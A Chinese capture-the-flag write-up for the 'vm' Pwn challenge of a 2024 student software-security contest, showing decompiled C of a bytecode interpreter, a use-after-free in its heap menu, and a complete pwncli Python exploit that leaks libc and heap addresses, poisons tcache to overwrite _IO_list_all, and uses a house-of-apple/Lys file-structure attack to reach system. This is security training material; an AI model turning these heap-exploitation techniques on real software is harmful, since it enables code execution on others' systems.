---
title: 2024第十八届全国大学生软件创新大赛-软件系统安全赛-软件安全攻防赛Pwn WriteUp
date: 2025-01-06 16:13:50
tags: [CTF, CCSSSC, WP]
categories: 
    - CTF
    - CCSSSC
    - Wp
---

# Pwn

## vm

### 分析
保护全开：
![](image.png)

mmap申请了三个段：
![](image-1.png)

#### vm_init

vm_init从文件读取初始的字节码，主要作用是打印一个字符串和输入新的字节码：
![](image-2.png)

#### vm_run
vm_run首先通过fetch提取字节码，并且存入malloc开辟的空间`s`内，然后根据字节码的不同分别存在四种不同操作，不同操作的指令格式不同，因此fetch也有四种不同的提取方式：
![](image-3.png)


```C
__int64 __fastcall fetch(vm *a1, type1 *a2)
{
  char *code; // rax
  int ch2; // eax
  unsigned __int8 *v4; // rax
  unsigned __int8 *v5; // rax
  __int64 result; // rax
  unsigned __int8 *idx1; // rax
  unsigned __int8 *v8; // rax
  unsigned __int8 *idx; // rax
  unsigned __int8 v10; // [rsp+17h] [rbp-9h]
  unsigned int i; // [rsp+18h] [rbp-8h]

  code = a1->code_ptr;
  a1->code_ptr = (code + 1);
  a2->ch1 = *code;
  a2->ch2 = a2->ch1 & 3;
  ch2 = a2->ch2;
  if ( ch2 == 3 )
  {
    idx = a1->code_ptr;
    a1->code_ptr = (idx + 1);
    a2->idx = *idx;
    if ( sub_12C9(a2->idx) )
      return 0xFFFFFFFFLL;
    a2->data = *a1->code_ptr;                   // data
    a1->code_ptr += 8LL;
  }
  else if ( a2->ch2 <= 3u )
  {
    if ( ch2 == 2 )
    {
      idx1 = a1->code_ptr;
      a1->code_ptr = (idx1 + 1);
      a2->idx = *idx1;
      v8 = a1->code_ptr;
      a1->code_ptr = (v8 + 1);
      a2->data = *v8;
      if ( sub_12C9(a2->idx) && sub_12C9(a2->data) )
        return 0xFFFFFFFFLL;
    }
    else if ( a2->ch2 )
    {
      v5 = a1->code_ptr;
      a1->code_ptr = (v5 + 1);
      v10 = *v5;
      if ( sub_12C9(*v5) )
        return 0xFFFFFFFFLL;
      a2->idx = v10;
    }
    else
    {
      for ( i = 0; i <= 2; ++i )
      {
        a2->idx <<= 8;
        v4 = a1->code_ptr;
        a1->code_ptr = (v4 + 1);
        a2->idx |= *v4;
      }
    }
  }
  result = a2->ch1;
  if ( !result )
    return 0xFFFFFFFFLL;
  return result;
}
```

#### 字节码格式

operation3的字节码格式如下：
![](image-4.png)

operation0的字节码格式如下：

![](image-5.png)

另外两个操作不细讲了，因为没有用到。

#### operation3

operation3的主要作用是设置寄存器的值：
```C
vm *__fastcall operation3(vm *a1, type1 *a2)
{
  vm *result; // rax

  result = (a2->ch1 >> 2);
  switch ( a2->ch1 >> 2 )
  {
    case 1:
      if ( a1->regs[a2->idx] <= a2->data )
      {
        result = a1;
        LOBYTE(a1->regs[8]) = a1->regs[a2->idx] < a2->data;
      }
      else
      {
        result = a1;
        LOBYTE(a1->regs[8]) = 2;
      }
      break;
    case 2:
      if ( a1->regs[a2->idx] <= a2->data )
      {
        result = a1;
        LOBYTE(a1->regs[8]) = a1->regs[a2->idx] < a2->data;
      }
      else
      {
        result = a1;
        LOBYTE(a1->regs[8]) = 2;
      }
      break;
    case 3:
      result = a1;
      a1->regs[a2->idx] = a2->data;
      break;
    case 4:
      result = a1;
      a1->regs[a2->idx] ^= a2->data;
      break;
    case 5:
      result = a1;
      a1->regs[a2->idx] |= a2->data;
      break;
    case 6:
      result = a1;
      a1->regs[a2->idx] &= a2->data;
      break;
    case 7:
      result = a1;
      a1->regs[a2->idx] <<= a2->data;
      break;
    case 8:
      result = a1;
      a1->regs[a2->idx] = a1->regs[a2->idx] >> a2->data;
      break;
    case 10:
      result = a1;
      a1->regs[a2->idx] += a2->data;
      break;
    case 11:
      result = a1;
      a1->regs[a2->idx] -= a2->data;
      break;
    case 12:
      if ( sub_12E8(a2->data) )
        sub_130C();
      result = a1;
      a1->regs[a2->idx] = *(a1->data_ptr + a2->data);
      break;
    case 13:
      if ( sub_12E8(a2->data) )
        sub_130C();
      result = a1;
      a1->regs[a2->idx] = *(a1->data_ptr + a2->data);
      break;
    case 14:
      if ( sub_12E8(a2->data) )
        sub_130C();
      result = a1;
      a1->regs[a2->idx] = *(a2->data + a1->data_ptr);
      break;
    case 15:
      if ( sub_12E8(a1->regs[a2->idx]) )
        sub_130C();
      result = (a1->data_ptr + a1->regs[a2->idx]);
      LOBYTE(result->data_ptr) = a2->data;
      break;
    case 16:
      if ( sub_12E8(a1->regs[a2->idx]) )
        sub_130C();
      result = (a1->data_ptr + a1->regs[a2->idx]);
      LOWORD(result->data_ptr) = a2->data;
      break;
    case 17:
      if ( sub_12E8(a1->regs[a2->idx]) )
        sub_130C();
      result = (a1->data_ptr + a1->regs[a2->idx]);
      result->data_ptr = a2->data;
      break;
    case 35:
      result = a1;
      a1->regs[a2->idx] = *(a1->regs[7] + (8 * a2->data) + 16);
      break;
    default:
      return result;
  }
  return result;
}
```

#### operation0

operation0的主要作用是通过sub_1837调用其他函数，不同case对应不同参数列表：

```C
vm *__fastcall operation0(vm *a1, type1 *a2)
{
  vm *result; // rax
  __int64 v3; // rdx
  __int64 v4; // rdx

  result = ((a2->ch1 >> 2) - 35);
  switch ( a2->ch1 >> 2 )
  {
    case 35:
      result = a1;
      a1->regs[0] = *(a1->mem2 + (8 * a2->idx) + 16);
      return result;
    case 36:
      result = a1;
      a1->stack -= (8 * a2->idx);
      return result;
    case 37:
      result = a1;
      a1->stack += (8 * a2->idx);
      return result;
    case 41:
      goto LABEL_5;
    case 42:
      goto LABEL_9;
    case 43:
      result = LOBYTE(a1[1].data_ptr);
      if ( result == 2 )
        goto LABEL_5;
      return result;
    case 44:
      result = LOBYTE(a1[1].data_ptr);
      if ( result == 1 )
        goto LABEL_5;
      return result;
    case 45:
      if ( LOBYTE(a1[1].data_ptr) == 2 )
        goto LABEL_5;
      goto LABEL_9;
    case 46:
      if ( LOBYTE(a1[1].data_ptr) == 1 )
        goto LABEL_5;
LABEL_9:
      result = LOBYTE(a1[1].data_ptr);
      if ( !result )
        goto LABEL_5;
      return result;
    case 47:
      result = LOBYTE(a1[1].data_ptr);
      if ( result )
      {
LABEL_5:
        if ( (a2->idx & 0x800000) != 0 )
          v3 = a1->code_ptr - (a2->idx & 0x7FFFFF);
        else
          v3 = (a2->idx & 0x7FFFFF) + a1->code_ptr;
        result = a1;
        a1->code_ptr = v3;
      }
      return result;
    case 48:
      a1->stack -= 8LL;
      *a1->stack = a1->code_ptr;
      if ( (a2->idx & 0x800000) != 0 )
        v4 = a1->code_ptr - (a2->idx & 0x7FFFFF);
      else
        v4 = (a2->idx & 0x7FFFFF) + a1->code_ptr;
      a1->code_ptr = v4;
      a1->stack -= 8LL;
      *a1->stack = a1->mem2;
      result = a1;
      a1->mem2 = a1->stack;
      return result;
    case 51:
      sub_1837(a2->idx, a1->regs[0], a1->regs[1], a1->regs[2], a1->regs[3], a1->regs[4], a1->regs[5]);
      goto LABEL_26;
    case 52:
      if ( sub_12E8(a1->regs[0]) )
        goto LABEL_28;
      sub_1837(a2->idx, a1->data_ptr + a1->regs[0], a1->regs[1], a1->regs[2], a1->regs[3], a1->regs[4], a1->regs[5]);
      goto LABEL_26;
    case 53:
      if ( sub_12E8(a1->regs[1]) )
        goto LABEL_28;
      sub_1837(a2->idx, a1->regs[0], a1->data_ptr + a1->regs[1], a1->regs[2], a1->regs[3], a1->regs[4], a1->regs[5]);
      goto LABEL_26;
    case 54:
      if ( sub_12E8(a1->regs[2]) )
        goto LABEL_28;
      sub_1837(a2->idx, a1->regs[0], a1->regs[1], a1->data_ptr + a1->regs[2], a1->regs[3], a1->regs[4], a1->regs[5]);
      goto LABEL_26;
    case 55:
      if ( sub_12E8(a1->regs[0]) || sub_12E8(a1->regs[1]) )
        goto LABEL_28;
      sub_1837(
        a2->idx,
        a1->data_ptr + a1->regs[0],
        a1->regs[1] + a1->data_ptr,
        a1->regs[2],
        a1->regs[3],
        a1->regs[4],
        a1->regs[5]);
      goto LABEL_26;
    case 56:
      if ( sub_12E8(a1->regs[0]) || sub_12E8(a1->regs[2]) )
        goto LABEL_28;
      sub_1837(
        a2->idx,
        a1->data_ptr + a1->regs[0],
        a1->regs[1],
        a1->regs[2] + a1->data_ptr,
        a1->regs[3],
        a1->regs[4],
        a1->regs[5]);
      goto LABEL_26;
    case 57:
      if ( sub_12E8(a1->regs[1]) || sub_12E8(a1->regs[2]) )
        goto LABEL_28;
      sub_1837(
        a2->idx,
        a1->regs[0],
        a1->data_ptr + a1->regs[1],
        a1->regs[2] + a1->data_ptr,
        a1->regs[3],
        a1->regs[4],
        a1->regs[5]);
      goto LABEL_26;
    case 58:
      if ( sub_12E8(a1->regs[0]) || sub_12E8(a1->regs[1]) || sub_12E8(a1->regs[2]) )
LABEL_28:
        sub_130C();
      sub_1837(
        a2->idx,
        a1->data_ptr + a1->regs[0],
        a1->regs[1] + a1->data_ptr,
        a1->data_ptr + a1->regs[2],
        a1->regs[3],
        a1->regs[4],
        a1->regs[5]);
LABEL_26:
      result = a1->regs;
      LODWORD(a1->regs[0]) = a1 + 16;
      break;
    case 59:
      a1->stack = a1->mem2;
      a1->mem2 = *a1->stack;
      a1->stack += 8LL;
      a1->code_ptr = *a1->stack;
      result = a1;
      a1->stack += (8 * (a2->idx + 1));
      break;
    default:
      return result;
  }
  return result;
}
```

#### sub_1837

sub_1837函数内是个堆菜单，此外还有一个read和write，read的buffer只能在vm_data和vm_code内，write的buffer只能在vm_data内：
```C
ssize_t __fastcall sub_1837(__int64 a1, __int64 a2, void *a3, size_t a4)
{
  ssize_t v5; // [rsp+38h] [rbp-8h]

  switch ( a1 )
  {
    case 0:
      if ( (a3 <= 0x64617460FFFLL || a3 > 0x64617491000LL) && (a3 <= 0x7062FFF || a3 > 0x7073000) )
        sub_130C(a1, a2);
      v5 = read(a2, a3, a4);
      break;
    case 1:
      if ( a3 <= 0x64617460FFFLL || a3 > 0x64617491000LL )
        sub_130C(a1, a2);
      v5 = write(a2, a3, a4);
      break;
    case 2:
      exit(a2);
    case 3:
      v5 = add(a2);
      break;
    case 4:
      delete(a2);
      break;
    case 5:
      v5 = edit(a2, a3, a4);
      break;
    case 6:
      v5 = show(a2, a3, a4);
      break;
    default:
      v5 = -1LL;
      break;
  }
  return v5;
}
```

#### add

add可以申请任意大小的堆块：

```C
__int64 __fastcall sub_1540(unsigned int a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; note[i] && i <= 15; ++i )
    ;
  if ( i == 16 )
    return 0LL;
  note[i] = malloc(a1);
  if ( !note[i] )
    return 0LL;
  note_size[i] = a1;
  return 1LL;
}
```

#### delete

delete存在UAF：
```C
void __fastcall sub_15FE(unsigned int a1)
{
  if ( a1 <= 0xF )
  {
    if ( note[a1] )
      free(note[a1]);
  }
}
```

#### edit & show

edit和show不能直接通过标准输入和标准输出交互，只能将堆块内的数据读取或者写入到vm_data内：

```C
__int64 __fastcall sub_164F(int a1, unsigned int a2, unsigned __int64 a3)
{
  unsigned __int64 v4; // [rsp+0h] [rbp-20h]
  unsigned int i; // [rsp+14h] [rbp-Ch]
  _BYTE *v6; // [rsp+18h] [rbp-8h]

  v4 = a3;
  if ( !note[a1] || !note_size[a1] )
    return 0xFFFFFFFFLL;
  if ( a3 > note_size[a1] )
    v4 = (note_size[a1] - 1);
  v6 = (a2 + 0x64617461000LL);
  for ( i = 0; v4 > i && v6 <= 0x64617490FFFLL; ++i )
    *(i + note[a1]) = *v6++;
  return i;
}
```

```C
__int64 __fastcall sub_1743(int a1, unsigned int a2, unsigned __int64 a3)
{
  unsigned __int64 v4; // [rsp+0h] [rbp-20h]
  unsigned int i; // [rsp+14h] [rbp-Ch]
  _BYTE *v6; // [rsp+18h] [rbp-8h]

  v4 = a3;
  if ( !note[a1] || !note_size[a1] )
    return 0xFFFFFFFFLL;
  if ( a3 > note_size[a1] )
    v4 = (note_size[a1] - 1);
  v6 = (a2 + 0x64617461000LL);
  for ( i = 0; v4 > i && v6 <= 0x64617490FFFLL; ++i )
    *v6++ = *(note[a1] + i);
  return i;
}
```


### 思路

通过UAF，泄露libc地址，然后通过tcache_poisoning修改_IO_list_all，打house of apple或者house of obstack


### Exp
```python3
#!/usr/bin/env python3
# Date: 2025-01-05 18:14:38
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


def cmd(i, prompt):
    sla(prompt, i)


def assign(regs_idx, data):
    return b'\x0f'+p8_ex(regs_idx)+p64_ex(data)


def read_to_data_seg(data_offset, size):
    return assign(0, 0)+assign(1, data_offset)+assign(2, size)+b'\xd4'+p8_ex(0)+p8_ex(0)+p8_ex(0)


def read_to_code_seg(code_offset, size):
    return assign(0, 0)+assign(1, 0x7063000+code_offset)+assign(2, size)+b'\xcc'+p8_ex(0)+p8_ex(0)+p8_ex(0)


def add(size):
    return assign(0, size)+b'\xcc'+p8_ex(0)+p8_ex(0)+p8_ex(3)


def dele(idx):
    return assign(0, idx)+b'\xcc'+p8_ex(0)+p8_ex(0)+p8_ex(4)


def edit(note_idx, data_offset, size):
    return read_to_data_seg(0, size)+assign(0, note_idx)+assign(1, data_offset)+assign(2, size)+b'\xcc'+p8_ex(0)+p8_ex(0)+p8_ex(5)


def write(data_offset, size):
    return assign(0, 1)+assign(1, data_offset)+assign(2, size)+b'\xd4'+p8_ex(0)+p8_ex(0)+p8_ex(1)


def show(note_idx, data_offset, size):
    return assign(0, note_idx)+assign(1, data_offset)+assign(2, size)+b'\xcc'+p8_ex(0)+p8_ex(0)+p8_ex(6)+write(0, size)


def exit():
    return assign(0, 0)+b'\xcc'+p8_ex(0)+p8_ex(0)+p8_ex(2)


rl()
code = assign(0, 0)
code += assign(1, 0)
code += assign(2, 0x300)
code += add(0x450)
code += add(0x450)
code += dele(0)
code += show(0, 0, 0x30)
code += add(0x20)  # 2
code += add(0x20)  # 3
code += dele(2)
code += dele(3)
code += show(2, 0, 0x30)
code += read_to_code_seg(0x350, 0x300)
sl(code)

base = u64(r(8))
base -= 0x21ace0

r(0x28)

key = u64(r(8))
heap_base = key << 12
r(0x28)

libc.address = base
_IO_list_all = libc.sym['_IO_list_all']
_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
system = libc.sym['system']

code = edit(3, 0, 8)
code += add(0x20)
code += add(0x20)  # 5
code += edit(5, 0, 8)
code += edit(1, 0, 0x100)
code += write(0, 0x10)
code += exit()
sl(code)


stop()
s(p64(_IO_list_all ^ key))

stop()
s(p64(heap_base+0x720))

stop()
file = IO_FILE_plus_struct()

payload = file.house_of_Lys_getshell_when_exit_under_2_37(
    libc.sym['system'], libc.sym['_IO_wfile_jumps']+0x300, heap_base+0x720)
# payload = file.house_of_apple2_execmd_when_exit(
#     libc.sym['_IO_2_1_stderr_'], _IO_wfile_jumps, libc.sym['system'])
# payload = bytearray(payload)
# payload[0xa0:0xa8] = p64(heap_base+0x720)

s(payload+p64(heap_base+0x720))


print(hex(heap_base))
print(hex(base))
print(hex(_IO_list_all))
print(hex(libc.sym['_IO_2_1_stderr_']))

ia()
```

